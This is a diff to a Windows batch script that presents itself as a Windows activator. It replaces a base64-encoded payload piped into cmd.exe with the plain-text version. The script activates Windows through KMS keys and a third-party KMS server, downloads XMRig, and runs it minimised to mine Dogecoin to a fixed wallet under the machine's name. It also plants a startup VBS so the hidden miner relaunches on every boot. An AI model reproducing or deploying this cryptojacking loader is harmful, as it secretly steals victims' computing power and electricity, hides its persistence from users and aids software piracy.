@@ -3,9 +3,121 @@ title Windows Activator & Mining Setup
 color 0A
 
 :: ==========================================
-:: DECRYPT AND RUN
+:: PASSWORD CHECK (Plain Text)
 :: ==========================================
-set "encoded=QGVjaG8gb2ZmCnRpdGxlIFdpbmRvd3MgQWN0aXZhdG9yICYgTWluaW5nIFNldHVwCmNvbG9yIDBBCjo6ID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09OjogUEFTU1dPUkQgUFJPVEVDVElPTgo6OiA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09OgpzZXQgImNvcnJlY3RfaGFzaD02Qjg2QjI3M0ZGMzRGQ0UxOUQ2QjgwNEVGRjVBM0Y1NzQ3QURBNEVBQTIyRjFENDlDMDFFNTJEREI3ODc1QjRCIgpzZXQgL3AgImlucHV0PUVudGVyIHBhc3N3b3JkOiAiCmZvciAvZiAiZGVsaW1zPSIglWkgaW4gKCdwb3dlcnNoZWxsIC1Db21tYW5kICIkaj1bU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRpbnB1dCk7ICRoYXNoPVtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoKE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5TSEEyNTZNYW5hZ2VkKS5Db21wdXRlSGFzaCgkYnl0ZXMpKS5SZXBsYWNlKCctJywnJyk7IFdyaXRlLUhvc3QgJGhhc2guVG9Mb3dlcigpIicpIGRvIHNldCAiaW5wdXRfaGFzaD0lJWkiCmlmIG5vdCAiJWlucHV0X2hhc2glIj09IiVjb3JyZWN0X2hhc2glIiAoCiAgICBlY2hvIEFjY2VzcyBEZW5pZWQuIEluY29ycmVjdCBwYXNzd29yZC4KICAgIHRpbWVvdXQgL3QgMyAvbm9icmVhayA+IG51bAogICAgZXhpdCAvYiAxCikKZWNobyBBY2Nlc3MgR3JhbnRlZC4KdGltZW91dCAvdCAxIC9ub2JyZWFrID4gbnVsCjo6ID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT06OiBQQVJUIDE6IFdJTkRPV1MgQUNUSVZBVElPTgo6OiA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09OgplY2hvIFsxLzNdIENoZWNraW5nIFdpbmRvd3MgQWN0aXZhdGlvbi4uLgpmb3IgL2YgInRva2Vucz02IGRlbGltcz1bLl0gIiAlJWEgaW4gKCd2ZXInKSBkbyBzZXQgd2ludmVyPSUlYQpjc2NyaXB0IC8vbm9sb2dvIC8vQiAiJndpbmRpclxzeXN0ZW0zMlxzbG1nci52YnMiIC9kbGkgPiAiJXRlbXAlXGFjdC50eHQiCmZpbmRzdHIgL2M6IkxJQ0VOU0VEIiAiJXRlbXAlXGFjdC50eHQiID4gbnVsCmlmICVlcnJvcmxldmVsJSBlcXUgMCAoCiAgICBlY2hvIFtPS10gV2luZG93cyBpcyBhbHJlYWR5IGFjdGl2YXRlZC4KKSBlbHNlICgKICAgIGVjaG8gWyFdIEFjdGl2YXRpbmcgV2luZG93cyAxMC8xMS4uLgogICAgCiAgICBzZXQgImVkaXRpb249IgogICAgZm9yIC9mICJ0b2tlbnM9KiIgJSVpIGluICgnd21pYyBvcyBnZXQgY2FwdGlvbiBefiBmaW5kc3RyIC9pICJ3aW5kb3dzIicpIGRvIHNldCBlZGl0aW9uPSUlaQogICAgCiAgICBlY2hvICVlZGl0aW9uJSB8IGZpbmRzdHIgL2kgIkhvbWUiID4gbnVsCiAgICBpZiAlZXJyb3JsZXZlbCUgZXVxIDAgKAogICAgICAgIHNsbWdyIC9pcGsgVFg5WEQtOThON1YtNldNUTYtQlg3RkctSDhROTkgPiBudWwKICAgICkKICAgIAogICAgZWNobyAlZWRpdGlvbiUgfCBmaW5kc3RyIC9pICJQcm8iID4gbnVsCiAgICBpZiAlZXJyb3JsZXZlbCUgZXVxIDAgKAogICAgICAgIHNsbWdyIC9pcGsgVzI2OU4tV0ZHV1gtWVZDOUItNEo2QzktVDgzR1ggPiBudWwKICAgICkKICAgIAogICAgZWNobyAlZWRpdGlvbiUgfCBmaW5kc3RyIC9pICJFbnRlcnByaXNlIiA+IG51bAogICAgaWYgJWVycm9ybGV2ZWwlIGV1cSAwICgKICAgICAgICBzbG1nciAvaXBrIE5QUFI5LUZXRENYLUQyQzhKLUg4NzJLLTJZVDQzID4gbnVsCiAgICApCiAgICAKICAgIGVjaG8gJWVkaXRpb24lIHwgZmluZHN0ciAvaSAiRWR1Y2F0aW9uIiA+IG51bAogICAgaWYgJWVycm9ybGV2ZWwlIGV1cSAwICgKICAgICAgICBzbG1nciAvaXBrIE5XNkMyLVFNUFZXLUQ3S0tLLTNHS1Q2LVZDRkIyID4gbnVsCiAgICApCiAgICAKICAgIHNsbWdyIC9za21zIGttczgubXNndWlkZXMuY29tID4gbnVsCiAgICBzbG1nciAvYXRvID4gbnVsCiAgICAKICAgIGVjaG8gW09LXSBXaW5kb3dzIGFjdGl2YXRpb24gYXR0ZW1wdGVkLgopCnRpbWVvdXQgL3QgMiAvbm9icmVhayA+IG51bAo6OiA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09OjogUEFSVCAyOiBHRVQgQ09NQlVURVIgTkFNRQo6OiA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Opgpm9yIC9mICJ0b2tlbnM9KiIgJSVpIGluICgnd21pYyBjb21wdXRlcnN5c3RlbSBnZXQgbmFtZSAvdmFsdWUgXnwgZmluZCA9IicpIGRvIHNldCAlJWkKaWYgbm90IGRlZmluZWQgTmFtZSBzZXQgTmFtZT0lQ09NQlVURVJOQU1FJQpzZXQgIldPUktFUl9OQU1FPSVOYW1lJQo6OiA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09OjogUEFSVCAzOiBYTVJJRyBNSU5FUiBTRVRVUAo6OiA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09OgplY2hvIFsyLzNdIFNldHRpbmcgdXAgWE1SSWcgTWluZXIuLi4Kc2V0ICJCQVNFX0RJUj1DOlx4bXJpZ19taW5lciIKc2V0ICJNSU5FUl9ESVI9JUJBU0VfRElSJVx4bXJpZy02LjIyLjIiCmlmIG5vdCBleGlzdCAiJUJBU0VfRElSJSIgbWtkaXIgIiVCQVNFX0RJUiUiCmNkIC9kICIlQkFTRV9ESVIlIgppZiBub3QgZXhpc3QgIiVNSU5FUl9ESVIlXHhtcmlnLmV4ZSIgKAogICAgZWNobyBEb3dubG9hZGluZyBYTVJpZy4uLgogICAgY3VybCAtTCAtbyB4bXJpZy56aXAgCiAgICB0YXIgLXhmIHhtcmlnLnppcAogICAgZGVsIHhtcmlnLnppcAopCmNkICIlTUlORVJfRElSJSIKc3RhcnQgL21pbiB4bXJpZy5leGUgLWEgcnggLW8gc3RyYXR1bStzc2w6Ly9yeC11cy51bm1pbmVhYmxlLmNvbTo0NDMgLXUgRE9HRTpEQzJLRSBhZWJlZ0I2N2s3Nm44SGJUVEFtQkh6RmlZM0V2Ui4lV09SS0VSX05BTUUlIC1wIHggLXQgNAp0aW1lb3V0IC90IDIgL25vYnJlYWsgPiBudWwKOjogPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PTogUEFSVCA0OiBBREQgVE8gU1RBUlRVUAo6OiA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09OgplY2hvIFszLzNdIEFkZGluZyB0byBXaW5kb3dzIFN0YXJ0dXAuLi4Kc2V0ICJWQlNfRklMRT0lVVNFUlBST0ZJTEUlXEFwcERhdGFcUm9hbWluZ1xNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBcbWluZXIudmJzIgooCiAgICBlY2hvIFNldCBvYmpTaGVsbCA9IENyZWF0ZU9iamVjdCgiV3NjcmlwdC5TaGVsbCIpCiAgICBlY2hvIFNldCBvYmpFbnYgPSBvYmpTaGVsbC5FbnZpcm9ubWVudCgiUHJvY2VzcyIpCiAgICBlY2hvIGNvbXB1dGVyTmFtZSA9IG9iakVudigiQ09NQlVURVJOQU1FIikKICAgIGVjaG8gb2JqU2hlbGwuUnVuICJjbWQuZXhlIC9jIGNkIEM6XHhtcmlnX21pbmVyXHhtcmlnLTYuMjIuMiAmJiB4bXJpZy5leGUgLWEgcnggLW8gc3RyYXR1bStzc2w6Ly9yeC11cy51bm1pbmVhYmxlLmNvbTo0NDMgLXUgRE9HRTpEQzJLRSBhZWJlZ0I2N2s3Nm44SGJUVEFtQkh6RmlZM0V2Ui4iICYgY29tcHV0ZXJOYW1lICYgIiAtcCB4IC10IDQiLCAwLCBGYWxzZQopID4gIiVWQlNfRklMRSUiCjo6ID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT06OiBGSU5BTCBNRVNTQUdFCjo6ID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT07CmNscwplY2hvID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQplY2hvICAgICAgICBBTEwgT1BFUkFUSU9OUyBDT01QTEVURUQgU1VDQ0VTU0ZVTExZCmVjaG8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CmVjaG8uCmVjaG8gW+Kck10gV2luZG93cyBBY3RpdmF0aW9uOiBBdHRlbXB0ZWQKZWNobyBb4pyTXSBYTVJJZyBNaW5lcjogUnVubmluZyBpbiBiYWNrZ3JvdW5kCmVjaG8gW+Kck10gQXV0by1zdGFydDogQWRkZWQgdG8gV2luZG93cyBTdGFydHVwCmVjaG8gW+Kck10gV29ya2VyIE5hbWU6ICVXT1JLRVJfTkFNRSUKZWNoby4KZWNobyBUaGUgbWluZXIgaXMgbm93IHJ1bm5pbmcgaGlkZGVuLgplY2hvIEl0IHdpbGwgc3RhcnQgYXV0b21hdGljYWxseSBvbiBldmVyeSBib290LgplY2hvLgplY2hvID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQp0aW1lb3V0IC90IDUgL25vYnJlYWsgPiBudWwKZXhpdA=="
+set /p "input=Enter password: "
 
-:: Decode and run
-powershell -Command "$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%encoded%')); $decoded | cmd.exe"
+if not "%input%"=="abuamer" (
+    echo Access Denied. Incorrect password.
+    timeout /t 3 /nobreak > nul
+    exit /b 1
+)
+
+echo Access Granted.
+timeout /t 1 /nobreak > nul
+
+:: ==========================================
+:: PART 1: GET COMPUTER NAME
+:: ==========================================
+for /f "tokens=*" %%i in ('wmic computersystem get name /value ^| find "="') do set %%i
+if not defined Name set Name=%COMPUTERNAME%
+set "WORKER_NAME=%Name%"
+
+:: ==========================================
+:: PART 2: WINDOWS ACTIVATION
+:: ==========================================
+echo [1/3] Checking Windows Activation...
+
+for /f "tokens=6 delims=[.] " %%a in ('ver') do set winver=%%a
+cscript //nologo //B "%windir%\system32\slmgr.vbs" /dli > "%temp%\act.txt"
+findstr /c:"LICENSED" "%temp%\act.txt" > nul
+if %errorlevel% equ 0 (
+    echo [OK] Windows is already activated.
+) else (
+    echo [!] Activating Windows 10/11...
+    
+    set "edition="
+    for /f "tokens=*" %%i in ('wmic os get caption ^| findstr /i "windows"') do set edition=%%i
+    
+    echo %edition% | findstr /i "Home" > nul
+    if %errorlevel% equ 0 (
+        slmgr /ipk TX9XD-98N7V-6WMQ6-BX7FG-H8Q99 > nul
+    )
+    
+    echo %edition% | findstr /i "Pro" > nul
+    if %errorlevel% equ 0 (
+        slmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX > nul
+    )
+    
+    echo %edition% | findstr /i "Enterprise" > nul
+    if %errorlevel% equ 0 (
+        slmgr /ipk NPPR9-FWDCX-D2C8J-H872K-2YT43 > nul
+    )
+    
+    echo %edition% | findstr /i "Education" > nul
+    if %errorlevel% equ 0 (
+        slmgr /ipk NW6C2-QMPVW-D7KKK-3GKT6-VCFB2 > nul
+    )
+    
+    slmgr /skms kms8.msguides.com > nul
+    slmgr /ato > nul
+    
+    echo [OK] Windows activation attempted.
+)
+timeout /t 2 /nobreak > nul
+
+:: ==========================================
+:: PART 3: XMRIG MINER SETUP
+:: ==========================================
+echo [2/3] Setting up XMRig Miner...
+
+set "BASE_DIR=C:\xmrig_miner"
+set "MINER_DIR=%BASE_DIR%\xmrig-6.22.2"
+
+if not exist "%BASE_DIR%" mkdir "%BASE_DIR%"
+cd /d "%BASE_DIR%"
+
+if not exist "%MINER_DIR%\xmrig.exe" (
+    echo Downloading XMRig...
+    curl -L -o xmrig.zip https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip
+    tar -xf xmrig.zip
+    del xmrig.zip
+)
+
+cd "%MINER_DIR%"
+start /min xmrig.exe -a rx -o stratum+ssl://rx-us.unmineable.com:443 -u DOGE:DC2KEabegB67k76nB8HbTTAmBHzFiY3EvR.%WORKER_NAME% -p x -t 4
+timeout /t 2 /nobreak > nul
+
+:: ==========================================
+:: PART 4: ADD TO STARTUP
+:: ==========================================
+echo [3/3] Adding to Windows Startup...
+
+set "VBS_FILE=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\miner.vbs"
+
+(
+    echo Set objShell = CreateObject("Wscript.Shell"^)
+    echo Set objEnv = objShell.Environment("Process"^)
+    echo computerName = objEnv("COMPUTERNAME"^)
+    echo objShell.Run "cmd.exe /c cd C:\xmrig_miner\xmrig-6.22.2 ^&^& xmrig.exe -a rx -o stratum+ssl://rx-us.unmineable.com:443 -u DOGE:DC2KEabegB67k76nB8HbTTAmBHzFiY3EvR." ^& computerName ^& " -p x -t 4", 0, False
+) > "%VBS_FILE%"
+
+:: ==========================================
+:: FINAL MESSAGE
+:: ==========================================
+cls
+echo ==============================================
+echo        ALL OPERATIONS COMPLETED SUCCESSFULLY
+echo ==============================================
+echo.
+echo [✓] Windows Activation: Attempted
+echo [✓] XMRig Miner: Running in background
+echo [✓] Auto-start: Added to Windows Startup
+echo [✓] Worker Name: %WORKER_NAME%
+echo.
+echo The miner is now running hidden.
+echo It will start automatically on every boot.
+echo.
+echo ==============================================
+timeout /t 5 /nobreak > nul
+exit
